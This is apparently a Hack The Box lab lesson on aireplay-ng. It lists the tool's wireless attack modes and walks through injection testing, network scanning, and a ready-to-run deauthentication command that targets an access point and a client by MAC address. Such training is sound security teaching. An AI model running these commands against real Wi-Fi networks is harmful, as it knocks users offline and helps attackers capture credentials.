```sh
3kjS@htb[/htb]$ aireplay-ng

 Attack modes (numbers can still be used):
...
      --deauth      count : deauthenticate 1 or all stations (-0)
      --fakeauth    delay : fake authentication with AP (-1)
      --interactive       : interactive frame selection (-2)
      --arpreplay         : standard ARP-request replay (-3)
      --chopchop          : decrypt/chopchop WEP packet (-4)
      --fragment          : generates valid keystream   (-5)
      --caffe-latte       : query a client for new IVs  (-6)
      --cfrag             : fragments against a client  (-7)
      --migmode           : attacks WPA migration mode  (-8)
      --test              : tests injection and quality (-9)
      --help              : Displays this usage screen
```

It currently implements multiple different attacks:

| **Attack** | **Attack Name**                      |
| ---------- | ------------------------------------ |
| `Attack 0` | Deauthentication                     |
| `Attack 1` | Fake authentication                  |
| `Attack 2` | Interactive packet replay            |
| `Attack 3` | ARP request replay attack            |
| `Attack 4` | KoreK chopchop attack                |
| `Attack 5` | Fragmentation attack                 |
| `Attack 6` | Cafe-latte attack                    |
| `Attack 7` | Client-oriented fragmentation attack |
| `Attack 8` | WPA Migration Mode                   |
| `Attack 9` | Injection test                       |
### Testing for Packet Injection

```sh
3kjS@htb[/htb]$ sudo iw dev wlan0mon set channel 1
```

Once we have our interface in monitor mode, it is very easy for us to test it for packet injection. We can utilize Aireplay-ng's test mode as follows.

```sh
3kjS@htb[/htb]$ sudo aireplay-ng --test wlan0mon
```
### Using Aireplay-ng to perform Deauthentication

First, let's use airodump-ng to view the available WiFi networks, also known as access points (APs).

```sh
3kjS@htb[/htb]$ sudo airodump-ng wlan0mon
```

From the above output, we can see that there are three available WiFi networks, and `two clients` are connected to the network named `HTB`. Let's send a deauthentication request to one of the clients with the station ID `00:0F:B5:32:31:31`.

```sh
3kjS@htb[/htb]$ sudo aireplay-ng -0 5 -a 00:14:6C:7A:41:81 -c 00:0F:B5:32:31:31 wlan0mon
```

- `-0` means deauthentication
- `5` is the number of deauths to send (you can send multiple if you wish); `0` means send them continuously
- `-a 00:14:6C:7A:41:81` is the MAC address of the access point
- `-c 00:0F:B5:32:31:31` is the MAC address of the client to deauthenticate; if this is omitted then all clients are deauthenticated
- `wlan0mon` is the interface name

Once the clients are deauthenticated from the AP, we can continue observing `airodump-ng` to see when they reconnect.

```sh
3kjS@htb[/htb]$ sudo airodump-ng wlan0mon
```